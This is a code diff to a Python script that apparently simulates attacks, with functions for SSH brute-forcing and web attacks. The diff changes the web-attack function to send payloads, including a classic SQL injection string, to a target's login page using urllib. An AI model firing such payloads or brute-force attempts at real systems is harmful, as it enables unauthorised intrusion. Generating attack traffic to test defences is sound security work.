@@ -37,7 +37,8 @@ def simulate_ssh_bruteforce(target_ip):
                 pass
 
 def simulate_web_attacks(target_ip):
-    import requests
+    import urllib.request
+    import urllib.parse
     # List of malicious payloads (SQL Injection and XSS)
     payloads = [
         "1' OR '1'='1",              # Classic SQLi
@@ -48,7 +49,9 @@ def simulate_web_attacks(target_ip):
     for payload in payloads:
         try:
             # Send payload in the query string
-            requests.get(f"http://{target_ip}/login", params={"user": payload}, timeout=1)
+            encoded_payload = urllib.parse.quote(payload)
+            url = f"http://{target_ip}/login?user={encoded_payload}"
+            urllib.request.urlopen(url, timeout=1)
         except Exception:
             pass
 
